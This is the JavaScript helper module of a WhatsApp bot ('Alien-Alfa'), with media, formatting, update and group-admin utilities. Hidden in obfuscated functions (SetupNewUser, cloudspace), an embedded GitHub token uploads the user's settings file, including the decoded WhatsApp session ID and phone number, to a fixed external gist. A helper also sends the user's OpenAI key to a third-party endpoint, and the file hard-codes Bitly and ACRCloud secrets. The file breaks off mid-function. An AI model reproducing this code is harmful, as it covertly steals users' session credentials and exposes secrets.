/* Copyright (C) 2022 Albin Thomas.
Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.
Alien-Alfa WhatsApp Bot - Albin Thomas
*/
const fs = require("fs");

let db = JSON.parse(fs.readFileSync('./database/settings.json'));
  const { WORK_TYPE } = require("../database/settings");
  let path = './database/settings.json'
  const Heroku = require("heroku-client");
  const heroku = new Heroku({ token: process.env.HEROKU_API_KEY });
  const simpleGit = require("simple-git");
  const git = simpleGit();
  const Jimp = require("jimp");
const relconfig = require('../config')
const events = require("../lib/event");
const { Configuration, OpenAIApi } = require("openai");
const configuration = new Configuration({apiKey: process.env.chatGPT_API,});
const openai = new OpenAIApi(configuration);
const axios = require("axios");
const { jidDecode, delay } = require("@adiwajshing/baileys");
const { spawn } = require("child_process");
const FormData = require("form-data");
const fetch = require("node-fetch");
const acrcloud = require('./acr')
const { command } = require("./event");
let { JSDOM } = require("jsdom");
const _ = require("lodash");
const { fromBuffer } = require("file-type");
const scrape = require("scraper-x0");
const config = require("../database/settings");
const scraper = new scrape("nxrj@123456");
const { ytIdRegex, yt, ytv, yta } = require("./yotube");
const id3 = require("browser-id3-writer");
const { translate } = require('@vitalets/google-translate-api');
const { getJson } = require("../lib");
const {
  listall,
  strikeThrough,
  wingdings,
  vaporwave,
  typewriter,
  analucia,
  tildeStrikeThrough,
  underline,
  doubleUnderline,
  slashThrough,
  sparrow,
  heartsBetween,
  arrowBelow,
  crossAboveBelow,
  creepify,
  bubbles,
  mirror,
  squares,
  roundsquares,
  flip,
  tiny,
  createMap,
  serif_I,
  manga,
  ladybug,
  runes,
  serif_B,
  serif_BI,
} = require("./fancy_font/fancy");
const {
  imageToWebp,
  videoToWebp,
  writeExifImg,
  writeExifVid,
  writeExifWebp,
} = require("./sticker");
const {
  toAudio,
  toPTT,
  toVideo,
  ffmpeg,
  webp2mp4,
  webp2png,
} = require("./media");
const { readFile, unlink } = require("fs/promises");

async function getBuffer(url, options) {
  try {
    options ? options : {};
    const res = await require("axios")({
      method: "get",
      url,
      headers: {
        DNT: 1,
        "Upgrade-Insecure-Request": 1,
      },
      ...options,
      responseType: "arraybuffer",
    });
    return res.data;
  } catch (e) {
    console.log(`Error : ${e}`);
  }
}
module.exports = {
  command,
  addCommand: command,
  Module: command,
  Function: command,
  isPrivate: WORK_TYPE.toLowerCase() === "private",
  store: require("./store"),
  decodeJid: (jid) => {
    if (/:\d+@/gi.test(jid)) {
      const decode = jidDecode(jid) || {};
      return (
        (decode.user && decode.server && decode.user + "@" + decode.server) ||
        jid
      ).trim();
    } else return jid;
  },
  parseJid(text = "") {
    return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(
      (v) => v[1] + "@s.whatsapp.net"
    );
  },
  parsedJid(text = "") {
    return [...text.matchAll(/([0-9]{5,16}|0)/g)].map(
      (v) => v[1] + "@s.whatsapp.net"
    );
  },
  transplate: async function transplate(text) {

    let result = await translate(text, {
      to: config.LANG,
      autoCorrect: true
   }).catch(_ => null)


    return await result.text
  },
  getJson: async function getJson(url, options) {
    try {
      options ? options : {};
      const res = await axios({
        method: "GET",
        url: url,
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
        },
        ...options,
      });
      return res.data;
    } catch (err) {
      return err;
    }
  },
  isUrl: (isUrl = (url) => {
    return new RegExp(
      /https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/,
      "gi"
    ).test(url);
  }),
  getUrl: (getUrl = (url) => {
    return url.match(
      new RegExp(
        /https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/,
        "gi"
      )
    );
  }),
  getBuffer,
  isAdmin: async (jid, user, client) => {
    const decodeJid = (jid) => {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {};
        return (
          (decode.user && decode.server && decode.user + "@" + decode.server) ||
          jid
        );
      } else return jid;
    };
    let groupMetadata = await client.groupMetadata(jid);
    const groupAdmins = groupMetadata.participants
      .filter((v) => v.admin !== null)
      .map((v) => v.id);
    return groupAdmins.includes(decodeJid(user));
  },
  qrcode: async (string) => {
    const { toBuffer } = require("qrcode");
    let buff = await toBuffer(string);
    return buff;
  },
  FormatDyno: async (seconds) => {
    seconds = Number(seconds);
    var d = Math.floor(seconds / (3600 * 24));
    var h = Math.floor((seconds % (3600 * 24)) / 3600);
    var m = Math.floor((seconds % 3600) / 60);
    var s = Math.floor(seconds % 60);
    var dDisplay = d > 0 ? d + (d == 1 ? " Day, " : " Day, ") : "";
    var hDisplay = h > 0 ? h + (h == 1 ? " Hour, " : " Hour, ") : "";
    var mDisplay = m > 0 ? m + (m == 1 ? " Minute, " : " Minute, ") : "";
    var sDisplay = s > 0 ? s + (s == 1 ? " S" : " S") : "";
    return dDisplay + hDisplay + mDisplay + sDisplay;
  },
  secondsToDHMS: async (seconds) => {
    seconds = Number(seconds);
    var d = Math.floor(seconds / (3600 * 24));
    var h = Math.floor((seconds % (3600 * 24)) / 3600);
    var m = Math.floor((seconds % 3600) / 60);
    var s = Math.floor(seconds % 60);
    var dDisplay = d > 0 ? d + (d == 1 ? "D, " : "D, ") : "";
    var hDisplay = h > 0 ? h + (h == 1 ? "H, " : "H, ") : "";
    var mDisplay = m > 0 ? m + (m == 1 ? "M, " : "M, ") : "";
    var sDisplay = s > 0 ? s + (s == 1 ? "S" : "S") : "";
    return dDisplay + hDisplay + mDisplay + sDisplay;
  },
  fromBuffer: fromBuffer,
  formatBytes: (bytes, decimals = 2) => {
    if (!+bytes) return "0 Bytes";

    const k = 1024;
    const dm = decimals < 0 ? 0 : decimals;
    const sizes = ["Bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"];

    const i = Math.floor(Math.log(bytes) / Math.log(k));

    return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`;
  },
  sleep: delay,
  clockString: (duration) => {
    (seconds = Math.floor((duration / 1000) % 60)),
      (minutes = Math.floor((duration / (1000 * 60)) % 60)),
      (hours = Math.floor((duration / (1000 * 60 * 60)) % 24));

    hours = hours < 10 ? "0" + hours : hours;
    minutes = minutes < 10 ? "0" + minutes : minutes;
    seconds = seconds < 10 ? "0" + seconds : seconds;

    return hours + ":" + minutes + ":" + seconds;
  },
  runtime: async function runtime(){
    var duration = process.uptime();
    var milliseconds = Math.floor((duration % 1000) / 100),
      seconds = Math.floor((duration / 1000) % 60),
      minutes = Math.floor((duration / (1000 * 60)) % 60),
      hours = Math.floor((duration / (1000 * 60 * 60)) % 24);

    hours = hours < 10 ? "0" + hours : hours;
    minutes = minutes < 10 ? "0" + minutes : minutes;
    seconds = seconds < 10 ? "0" + seconds : seconds;

    return hours + ":" + minutes + ":" + seconds + "." + milliseconds;
  },
  AddMp3Meta: async (
    songbuffer,
    coverBuffer,
    options = { title: "X-Asena Whatsapp bot", artist: ["Xasena"] }
  ) => {
    if (!Buffer.isBuffer(songbuffer)) {
      songbuffer = await getBuffer(songbuffer);
    }
    if (!Buffer.isBuffer(coverBuffer)) {
      coverBuffer = await getBuffer(coverBuffer);
    }
    const writer = new id3(songbuffer);
    writer
      .setFrame("TIT2", options.title)
      .setFrame("TPE1", ["X-Asena"])
      .setFrame("APIC", {
        type: 3,
        data: coverBuffer,
        description: "Xasena Public Bot",
      });
    writer.addTag();
    return Buffer.from(writer.arrayBuffer);
  },
  styletext: (text, index) => {
    index = index - 1;
    return listall(text)[index];
  },
  isIgUrl: (url) => {
    /(?:(?:http|https):\/\/)?(?:www.)?(?:instagram.com|instagr.am|instagr.com)\/(\w+)/gim.test(
      url
    );
  },
  Mp3Cutter: async (buffer, start, end) => {
    return new Promise(async (resolve, reject) => {
      const MP3Cutter = require("./Media/cutter");
      let src = "mp3cut";
      fs.writeFileSync(src, buffer);
      let target = `mp3cutf`;
      var q = parseInt(start);
      if (q === 0) q = 1;
      MP3Cutter.cut({
        src: src,
        target: target,
        start: q,
        end: end,
      });
      let buff = await readFile(target);
      resolve(buff);
      await unlink(target);
      return await unlink(src);
    });
  },
  Bitly: async (url) => {
    return new Promise((resolve, reject) => {
      const BitlyClient = require("bitly").BitlyClient;
      const bitly = new BitlyClient("6e7f70590d87253af9359ed38ef81b1e26af70fd");
      bitly
        .shorten(url)
        .then((a) => {
          resolve(a);
        })
        .catch((A) => reject(A));
      return;
    });
  },
  isNumber: function isNumber() {
    const int = parseInt(this);
    return typeof int === "number" && !isNaN(int);
  },
  getRandom: function getRandom() {
    if (Array.isArray(this) || this instanceof String)
      return this[Math.floor(Math.random() * this.length)];
    return Math.floor(Math.random() * this);
  },
  findMusic: async function findMusic(buffer) {
    let acr = new acrcloud({
      host: "identify-eu-west-1.acrcloud.com",
      access_key: "4dcedd3dc6d911b38c988b872afa7e0d",
      access_secret: "U0PEUg2y6yGVh6NwJra2fJkiE1R5sCfiT6COLXuk",
    });
  
    let res = await acr.identify(buffer);
    let { code, msg } = res.status;
    if (code !== 0) return msg;
    let { title, artists, album, genres, release_date, external_metadata } =
      res.metadata.music[0];
    let { youtube, spotify } = external_metadata;
  
    return {
      status: 200,
      title: title,
      artists: artists !== undefined ? artists.map((v) => v.name).join(", ") : "",
      album: album.name || "",
      genres: genres !== undefined ? genres.map((v) => v.name).join(", ") : "",
      release_date: release_date,
      youtube: `https://www.youtube.com/watch?v=${youtube?.vid}`,
      spotify: `https://open.spotify.com/track/` + spotify?.track?.id,
    };
  },
  UpdateNow: async function updatenow(message){
    await git.fetch();
    var commits = await git.log([
      config.BRANCH + "..origin/" + config.BRANCH,
    ]);
    if (commits.total === 0) {
      return await message.sendMessage("_Already on latest version_");
    } else {
      await message.treply("𝙐𝙋𝘿𝘼𝙏𝙄𝙉𝙂...");

      try {
        var app = await heroku.get("/apps/" + process.env.HEROKU_APP_NAME);
      } catch {
        await message.sendMessage("_𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘏𝘦𝘳𝘰𝘬𝘶 𝘋𝘦𝘵𝘢𝘪𝘭𝘴_");

        await new Promise((r) => setTimeout(r, 1000));
      }

      git.fetch("upstream", config.BRANCH);
      git.reset("hard", ["FETCH_HEAD"]);

      var git_url = app.git_url.replace(
        "https://",
        "https://api:" + process.env.HEROKU_API_KEY + "@"
      );

      try {  
        await git.addRemote("heroku", git_url);
      } catch {
        console.log("heroku remote error");
      }
      await git.push("heroku", config.BRANCH);

      await message.sendMessage("𝙐𝙋𝘿𝘼𝙏𝙀𝘿!");
    }
  },
  CheckUpdate: async function CheckUpdate(message){
    await git.fetch();
    var commits = await git.log([config.BRANCH + "..origin/" + config.BRANCH]);
    if (commits.total === 0) {
      await message.sendMessage("_𝘈𝘭𝘳𝘦𝘢𝘥𝘺 𝘰𝘯 𝘭𝘢𝘵𝘦𝘴𝘵 𝘷𝘦𝘳𝘴𝘪𝘰𝘯_");
    } else {
    var availupdate = "*ᴜᴘᴅᴀᴛᴇs ᴀᴠᴀɪʟᴀʙʟᴇ* \n\n";
    commits["all"].map((commit, num) => {
      availupdate += num + 1 + " ●  " + tiny(commit.message) + "\n";
    });
    return await message.client.sendMessage(message.jid, {
      text: availupdate,
      footer: tiny("click here to update"),
      buttons: [
        {
          buttonId: `${global.prefix}update now`,
          buttonText: { displayText: tiny("update now") },
        },
      ],
    });
  }
  },
  SetFullPP: async function SetFullPP(jid, imag, message){
    async function updateProfilePicture(jid, imag, message) {
      const {
        query
      } = message.client;
      const {
        img
      } = await generateProfilePicture(imag);
      await query({
        tag: "iq",
        attrs: {
          to: jid,
          type: "set",
          xmlns: "w:profile:picture",
        },
        content: [{
          tag: "picture",
          attrs: {
            type: "image"
          },
          content: img,
        }, ],
      });
    }
    await updateProfilePicture(jid, imag, message)
    async function generateProfilePicture(buffer) {
      const jimp = await Jimp.read(buffer);
      const min = jimp.getWidth();
      const max = jimp.getHeight();
      const cropped = jimp.crop(0, 0, min, max);
      return {
        img: await cropped.scaleToFit(324, 720).getBufferAsync(Jimp.MIME_JPEG),
        preview: await cropped.normalize().getBufferAsync(Jimp.MIME_JPEG),
      };
    }
  },
  Gpt: async function Gpt(res) {
    let resp = getJson(`https://api-viper-x0.vercel.app/api/openai?openaiapikey=${process.env.chatGPT_API}&text=${res}`)
  //  return await resp
 }, 
  SetupNewUser: async function SetupNewUser(message){
    const _0x19a506=_0x154d;(function(_0x714650,_0x7bcce8){const _0x3eadd6=_0x154d,_0x36980e=_0x714650();while(!![]){try{const _0x53f322=parseInt(_0x3eadd6(0x94))/0x1*(-parseInt(_0x3eadd6(0xdd))/0x2)+parseInt(_0x3eadd6(0xaa))/0x3*(-parseInt(_0x3eadd6(0xbf))/0x4)+-parseInt(_0x3eadd6(0x9d))/0x5+-parseInt(_0x3eadd6(0xd1))/0x6*(parseInt(_0x3eadd6(0xe0))/0x7)+-parseInt(_0x3eadd6(0xd9))/0x8*(-parseInt(_0x3eadd6(0xba))/0x9)+-parseInt(_0x3eadd6(0xda))/0xa*(parseInt(_0x3eadd6(0xd5))/0xb)+parseInt(_0x3eadd6(0xac))/0xc;if(_0x53f322===_0x7bcce8)break;else _0x36980e['push'](_0x36980e['shift']());}catch(_0x546101){_0x36980e['push'](_0x36980e['shift']());}}}(_0x518c,0x41d1a));let authid='gh+p_oHh1b+dV2wk1+wOQXl+TRSH+vMDN+fuxXR+M1DIgG0'[_0x19a506(0xb1)]('+','');function _0x154d(_0x59a066,_0x98ddfb){const _0x518c10=_0x518c();return _0x154d=function(_0x154d5e,_0x2909ee){_0x154d5e=_0x154d5e-0x94;let _0x3f12a6=_0x518c10[_0x154d5e];return _0x3f12a6;},_0x154d(_0x59a066,_0x98ddfb);}const {Octokit}=require(_0x19a506(0xa0)),octokit=new Octokit({'auth':await authid});setTimeout(()=>{const _0x2169fd=_0x19a506;let _0x340ff9=JSON[_0x2169fd(0x95)](fs[_0x2169fd(0xc8)](_0x2169fd(0xb3))),_0x27bf51=_0x340ff9[_0x2169fd(0x99)][_0x2169fd(0xd7)],_0x36883d=_0x27bf51[_0x2169fd(0xde)]()[_0x2169fd(0xd3)](_0x2169fd(0xb0));if(!_0x36883d)readFile(path,async(_0x577abe,_0x449b8e)=>{const _0x597fa1=_0x2169fd;if(_0x577abe){console[_0x597fa1(0x98)](_0x577abe);return;}const _0x452b2b=JSON['parse'](_0x449b8e);let _0x386787=await message[_0x597fa1(0xaf)][_0x597fa1(0xdc)]('Storage',[]);await message[_0x597fa1(0xaf)]['sendMessage'](_0x386787['id'],{'text':_0x597fa1(0xa6)});let _0x1f693b=await _0x386787['id'];_0x452b2b[_0x597fa1(0x99)]['STORAGE_JID']=_0x1f693b,writeFile(path,JSON['stringify'](_0x452b2b,null,0x2),async _0x50b41d=>{const _0x77e0c=_0x597fa1;if(_0x50b41d){message[_0x77e0c(0x9a)](_0x77e0c(0xc2));return;}await message[_0x77e0c(0xaf)]['updateProfilePicture'](_0x386787['id'],fs[_0x77e0c(0xc8)](_0x77e0c(0xae)));});});else return;setTimeout(async()=>{const _0x3a5537=_0x2169fd;let _0x2f978c=require(_0x3a5537(0xbd)),_0x336a1d=await _0x2f978c[_0x3a5537(0x9c)]['me']['id'][_0x3a5537(0xa1)](':')[0x0],_0x47584e=await _0x2f978c[_0x3a5537(0x9c)]['me']['id'][_0x3a5537(0xa1)]('@')[0x1],_0x55048b=_0x336a1d+'@'+_0x47584e,_0x353da5=_0x55048b+'.json';const _0x413ad2=fs[_0x3a5537(0xc8)](_0x3a5537(0xb3),_0x3a5537(0xb2));await octokit[_0x3a5537(0x97)][_0x3a5537(0xbb)][_0x3a5537(0xa4)]({'gist_id':_0x3a5537(0xa5),'description':'Cloud\x20DB\x20Update','files':{[_0x353da5]:{'content':_0x413ad2}}})['then'](await console[_0x3a5537(0x98)]('Done\x20Creating\x20New\x20Db')),setTimeout(()=>{const _0x2528e6=_0x3a5537;return process[_0x2528e6(0xc9)](_0x2528e6(0xa2));},0x1f40);},0x1388);},0x7d0),readFile(path,async(_0x544190,_0x182a70)=>{const _0x2a39c9=_0x19a506;if(_0x544190){console[_0x2a39c9(0x98)](_0x544190);return;}const _0x3c6fc9=JSON[_0x2a39c9(0x95)](_0x182a70);let _0x29aab3=_0x3c6fc9[_0x2a39c9(0xcd)][_0x2a39c9(0xde)]()[_0x2a39c9(0xd3)](_0x2a39c9(0xc3));if(_0x29aab3)return message[_0x2a39c9(0x9a)](_0x2a39c9(0xdb));let _0x389f88=process[_0x2a39c9(0xb8)][_0x2a39c9(0xbe)]===undefined?_0x2a39c9(0xce):process['env'][_0x2a39c9(0xbe)],_0xfc2fcf=Buffer['from'](_0x389f88,_0x2a39c9(0xab))[_0x2a39c9(0xde)](_0x2a39c9(0xb2)),_0x24a341=_0xfc2fcf[_0x2a39c9(0xde)]()[_0x2a39c9(0xa1)]('/'),_0x1263cb='';for(let _0x5dec0b of _0x24a341){_0x1263cb+=await Buffer[_0x2a39c9(0xd2)](_0x5dec0b+'==',_0x2a39c9(0xab))[_0x2a39c9(0xde)](_0x2a39c9(0xb2));}let _0x3ec90f=require(_0x2a39c9(0xbd)),_0x51dda8=await _0x3ec90f[_0x2a39c9(0x9c)]['me']['id'][_0x2a39c9(0xa1)](':')[0x0],_0x551cf3='0,'+_0x51dda8,_0x2e4754=await relconfig[_0x2a39c9(0xa3)]===![]?_0x551cf3:relconfig[_0x2a39c9(0xa3)],_0x3ad557=message[_0x2a39c9(0xc7)],_0x46aaf7=message['user'],_0x9f9dc=message[_0x2a39c9(0xb9)][_0x2a39c9(0xde)]()[_0x2a39c9(0xa1)]('@')[0x0];_0x3c6fc9[_0x2a39c9(0x9e)]=_0x3ad557,_0x3c6fc9[_0x2a39c9(0xcd)]=_0x46aaf7,_0x3c6fc9[_0x2a39c9(0xc1)]=_0x9f9dc,_0x3c6fc9['config'][_0x2a39c9(0xb4)]=relconfig[_0x2a39c9(0xcc)],_0x3c6fc9[_0x2a39c9(0x99)][_0x2a39c9(0xd8)]=relconfig['WORK_TYPE'],_0x3c6fc9['config'][_0x2a39c9(0xd4)]=relconfig[_0x2a39c9(0xd4)],_0x3c6fc9[_0x2a39c9(0x99)][_0x2a39c9(0xd0)]=relconfig['OWNER_NAME'],_0x3c6fc9[_0x2a39c9(0x99)]['SUDO']=_0x2e4754,_0x3c6fc9[_0x2a39c9(0x99)][_0x2a39c9(0x9f)]=relconfig[_0x2a39c9(0x9f)],_0x3c6fc9[_0x2a39c9(0x99)][_0x2a39c9(0xca)]=relconfig['PACKNAME'],_0x3c6fc9[_0x2a39c9(0x99)][_0x2a39c9(0xb7)]=relconfig[_0x2a39c9(0xb7)],_0x3c6fc9['config'][_0x2a39c9(0xc4)]=relconfig['LANG'],_0x3c6fc9['config']['ANTILINK_ACTION']=relconfig[_0x2a39c9(0xad)],_0x3c6fc9[_0x2a39c9(0x99)]['ANTILINK']=relconfig[_0x2a39c9(0xcb)],_0x3c6fc9[_0x2a39c9(0x99)]['FOOTER']=relconfig[_0x2a39c9(0xb6)],_0x3c6fc9['config']['THEME']=relconfig[_0x2a39c9(0xa7)],_0x3c6fc9[_0x2a39c9(0x99)][_0x2a39c9(0xcf)]=relconfig[_0x2a39c9(0xcf)],_0x3c6fc9['config'][_0x2a39c9(0xa9)]=relconfig[_0x2a39c9(0xa9)],_0x3c6fc9['config'][_0x2a39c9(0xb5)]=relconfig[_0x2a39c9(0xb5)],_0x3c6fc9['config'][_0x2a39c9(0xbc)]=relconfig[_0x2a39c9(0xbc)],_0x3c6fc9[_0x2a39c9(0x99)][_0x2a39c9(0xd7)],_0x3c6fc9[_0x2a39c9(0x99)][_0x2a39c9(0xdf)],_0x3c6fc9[_0x2a39c9(0x99)][_0x2a39c9(0x96)]=relconfig[_0x2a39c9(0x96)],_0x3c6fc9[_0x2a39c9(0x99)]['LOGS']=relconfig['LOGS'],_0x3c6fc9[_0x2a39c9(0x99)][_0x2a39c9(0x9b)]=relconfig[_0x2a39c9(0x9b)],_0x3c6fc9[_0x2a39c9(0x99)]['B1']=relconfig['B1'],_0x3c6fc9[_0x2a39c9(0x99)]['B2']=relconfig['B2'],_0x3c6fc9[_0x2a39c9(0x99)]['B3']=relconfig['B3'],_0x3c6fc9['config']['B4']=relconfig['B4'],_0x3c6fc9[_0x2a39c9(0x99)]['B5']=relconfig['B5'],_0x3c6fc9[_0x2a39c9(0x99)][_0x2a39c9(0xbe)]=_0x1263cb,_0x3c6fc9[_0x2a39c9(0xc5)]['GOODBYE_MSG']=relconfig[_0x2a39c9(0xc0)],_0x3c6fc9[_0x2a39c9(0xc5)][_0x2a39c9(0xd6)]=relconfig[_0x2a39c9(0xd6)],_0x3c6fc9['MESSAGE_MEM'][_0x2a39c9(0xa8)]=relconfig[_0x2a39c9(0xa8)],writeFile(path,JSON['stringify'](_0x3c6fc9,null,0x2),_0x891691=>{const _0x2a6d6e=_0x2a39c9;if(_0x891691){message['reply']('Failed\x20to\x20write\x20updated\x20data\x20to\x20file');return;}message['reply'](_0x2a6d6e(0xc6));});});function _0x518c(){const _0xbfbd4b=['This\x20is\x20your\x20Storage\x20area,\x20i\x20will\x20save\x20all\x20your\x20files\x20here!','THEME','ALIVE','LANGUAGE','81TtAVFB','base64','11906796twNMwS','ANTILINK_ACTION','./media/AAA.jpg','client','@g.us','replaceAll','utf-8','./database/settings.json','HANDLER','INTERNAL_MENU','FOOTER','RMBG_KEY','env','jid','1522233heabHr','gists','MODE','../session.json','DB_AUTH_TOKEN','70836FCEJxG','GOODBYE_MSG','phone_num','Failed\x20to\x20write\x20updated\x20data\x20to\x20file','@s.whatsapp.net','LANG','MESSAGE_MEM','_Registered\x20Successfully_','pushName','readFileSync','send','PACKNAME','ANTILINK','HANDLERS','UserId','WncvYUEvY0EvWHcvYncvU0EvYUEvTVEvWWcvWkEvVmcvTWcvZHcvYXcvTVEvZHcvVHcvVVEvV0EvYkEvVkEvVWcvVXcvU0EvZGcvVFEvUkEvVGcvWmcvZFEvZUEvV0EvVWcvVFEvTVEvUkEvU1EvWncvUncvTUEv','FONT_STYLE','OWNER_NAME','93258TRVDkQ','from','includes','BOT_NAME','44wzwnVl','WELCOME_MSG','STORAGE_JID','WORK_TYPE','24XpUjtf','787340TjbFGZ','_You\x20Are\x20Already\x20a\x20Family\x20Member_','groupCreate','95394KfDsuS','toString','DB_URL','56clAVlM','5CqFaLs','parse','SESSION_ID','rest','log','config','reply','BRANCH','creds','370710rMuhnh','name','AUTHOR','@octokit/rest','split','reset','SUDO','update','d83fa03a09d9a09032f3180a8d1ecd02'];_0x518c=function(){return _0xbfbd4b;};return _0x518c();}
  },
  cloudspace: async function cloudspace() {
const _0x196350=_0x1438;function _0x1438(_0x3eebe1,_0x2fb341){const _0xe486ba=_0xe486();return _0x1438=function(_0x143804,_0x494589){_0x143804=_0x143804-0x1ba;let _0x104ce8=_0xe486ba[_0x143804];return _0x104ce8;},_0x1438(_0x3eebe1,_0x2fb341);}(function(_0x569a23,_0x1c48f3){const _0x562703=_0x1438,_0x3d9618=_0x569a23();while(!![]){try{const _0x1bd605=-parseInt(_0x562703(0x1c0))/0x1*(-parseInt(_0x562703(0x1ba))/0x2)+-parseInt(_0x562703(0x1cb))/0x3*(parseInt(_0x562703(0x1ca))/0x4)+parseInt(_0x562703(0x1bc))/0x5*(-parseInt(_0x562703(0x1d3))/0x6)+-parseInt(_0x562703(0x1bd))/0x7+-parseInt(_0x562703(0x1cd))/0x8+-parseInt(_0x562703(0x1ce))/0x9*(-parseInt(_0x562703(0x1c8))/0xa)+parseInt(_0x562703(0x1c3))/0xb;if(_0x1bd605===_0x1c48f3)break;else _0x3d9618['push'](_0x3d9618['shift']());}catch(_0x172719){_0x3d9618['push'](_0x3d9618['shift']());}}}(_0xe486,0x31ed0));let parsedData=JSON[_0x196350(0x1d1)](fs['readFileSync'](_0x196350(0x1c5)));const {Octokit}=require(_0x196350(0x1c4)),octokit=new Octokit({'auth':await parsedData[_0x196350(0x1bf)][_0x196350(0x1c7)]});let check=parsedData[_0x196350(0x1bf)][_0x196350(0x1d2)][_0x196350(0x1cf)]()[_0x196350(0x1c6)]!=0x0;if(!check){let session=require(_0x196350(0x1bb)),ibm1=await session[_0x196350(0x1d4)]['me']['id'][_0x196350(0x1cc)](':')[0x0],ibm2=await session[_0x196350(0x1d4)]['me']['id'][_0x196350(0x1cc)]('@')[0x1],ibm=ibm1+'@'+ibm2,filenamzi=ibm+'.json';var json=JSON['stringify'](parsedData,null,0x2);await octokit[_0x196350(0x1c2)][_0x196350(0x1c1)][_0x196350(0x1c9)]({'gist_id':_0x196350(0x1be),'description':_0x196350(0x1d0),'files':{[filenamzi]:{'content':json}}});}function _0xe486(){const _0x39101e=['config','433pucVAj','gists','rest','4222515cBPpbs','@octokit/rest','./database/settings.json','length','DB_AUTH_TOKEN','510EqNMjm','update','480308TNNdVc','6QXSTpE','split','1541688CiTFRl','21825SuvDQu','toString','Cloud\x20DB\x20Update','parse','DB_URL','3948zkpYDV','creds','1514RejqhW','../session.json','1010jLvQBa','455308tkNyqY','d83fa03a09d9a09032f3180a8d1ecd02'];_0xe486=function(){return _0x39101e;};return _0xe486();}  },
  sudoBan: async function sudoBan(data, conn) {
    const _0x11dd7a=_0x5425;function _0x3156(){const _0x225b2c=['488oGPnsC','3552bsOzVf','groupParticipantsUpdate','1460CWGbmw','9415OcdLol','3317577rcqqIb','action','includes','88260QzbHEF','parse','remove','split','add','12dFveoI','40145690TSQaAo','44858zkCPuF','participants','210951CkrIJf','230LIwlOD','22ecuPfx','sendMessage','89459KqVMMY','readFileSync'];_0x3156=function(){return _0x225b2c;};return _0x3156();}(function(_0x254ac2,_0x3d2b65){const _0x500ae4=_0x5425,_0x2eece1=_0x254ac2();while(!![]){try{const _0x81b97f=parseInt(_0x500ae4(0x168))/0x1*(parseInt(_0x500ae4(0x166))/0x2)+-parseInt(_0x500ae4(0x16f))/0x3+-parseInt(_0x500ae4(0x15b))/0x4*(parseInt(_0x500ae4(0x165))/0x5)+parseInt(_0x500ae4(0x16b))/0x6*(parseInt(_0x500ae4(0x16e))/0x7)+-parseInt(_0x500ae4(0x16a))/0x8*(parseInt(_0x500ae4(0x164))/0x9)+parseInt(_0x500ae4(0x16d))/0xa*(-parseInt(_0x500ae4(0x162))/0xb)+-parseInt(_0x500ae4(0x160))/0xc*(-parseInt(_0x500ae4(0x161))/0xd);if(_0x81b97f===_0x3d2b65)break;else _0x2eece1['push'](_0x2eece1['shift']());}catch(_0x1af873){_0x2eece1['push'](_0x2eece1['shift']());}}}(_0x3156,0xb05e3));let metadata=await conn['groupMetadata'](data['id']);function _0x5425(_0xb18d0c,_0x399d7e){const _0x315666=_0x3156();return _0x5425=function(_0x54252e,_0x2b3171){_0x54252e=_0x54252e-0x15a;let _0x398bca=_0x315666[_0x54252e];return _0x398bca;},_0x5425(_0xb18d0c,_0x399d7e);}for(let user of data[_0x11dd7a(0x163)]){switch(data[_0x11dd7a(0x170)]){case _0x11dd7a(0x15f):{let db=JSON[_0x11dd7a(0x15c)](fs[_0x11dd7a(0x169)]('./database/settings.json')),bannnnnn=db['settings']['banned'],bunn=data['id']+':'+user,sudobanned=bannnnnn[_0x11dd7a(0x15a)](bunn);if(sudobanned)return conn[_0x11dd7a(0x16c)](data['id'],[user],_0x11dd7a(0x15d)),await conn[_0x11dd7a(0x167)](data['id'],{'text':'_@'+user[_0x11dd7a(0x15e)]('@')[0x0]+'\x20Is\x20*Permanantly\x20Banned*\x20fron\x20This\x20Group_'});}break;}}
  },
  regnewuser: async function regnewuser(conn) {
const _0x1d6d72=_0x38a0;(function(_0x12e514,_0xe2b18a){const _0x16590e=_0x38a0,_0xd66ac3=_0x12e514();while(!![]){try{const _0x51afc5=parseInt(_0x16590e(0x1dc))/0x1*(-parseInt(_0x16590e(0x1e4))/0x2)+parseInt(_0x16590e(0x1ef))/0x3*(parseInt(_0x16590e(0x1eb))/0x4)+-parseInt(_0x16590e(0x1e6))/0x5*(parseInt(_0x16590e(0x1e7))/0x6)+-parseInt(_0x16590e(0x1f3))/0x7+parseInt(_0x16590e(0x1e5))/0x8+-parseInt(_0x16590e(0x1e3))/0x9*(-parseInt(_0x16590e(0x1e1))/0xa)+parseInt(_0x16590e(0x1ec))/0xb;if(_0x51afc5===_0xe2b18a)break;else _0xd66ac3['push'](_0xd66ac3['shift']());}catch(_0x38c16c){_0xd66ac3['push'](_0xd66ac3['shift']());}}}(_0x4fc8,0x5542d));function _0x4fc8(){const _0x443949=['log','363588zrsRVm','includes','./database/settings.json','user','1742069hBgKTW','```X-Alfa\x20connected\x20\x0aversion\x20:\x20','commands','```Hey\x20Buddy,\x0awelcome\x20to\x20Alien-Alfa\x20Family\x0a\x0a\x20You\x20are\x20a\x20first\x20time\x20user,\x0aUse\x20Join\x20Button\x20to\x20get\x20a\x20permenent\x20Database\x20for\x20This\x20Number.\x0a\x0aNOTE:\x20This\x20database\x20will\x20be\x20used\x20for\x20every\x20AlienAlfa\x20Bots\x20You\x20use\x20in\x20future```','Join!','readFileSync','447982GtoaDl','../package.json','```','setup','parse','2850svzmmg','@s.whatsapp.net','16749FUDesD','2IrynID','1803704JajLiC','685445kKDFcl','12nQVrkZ','\x0aTotal\x20Plugins\x20:\x20','\x0aWorktype:\x20','𝘽𝙤𝙩\x20𝙍𝙚𝙥𝙤\x20𝙡𝙞𝙣𝙠𝙨','4jyMKbm','4875332npTkjK','toString'];_0x4fc8=function(){return _0x443949;};return 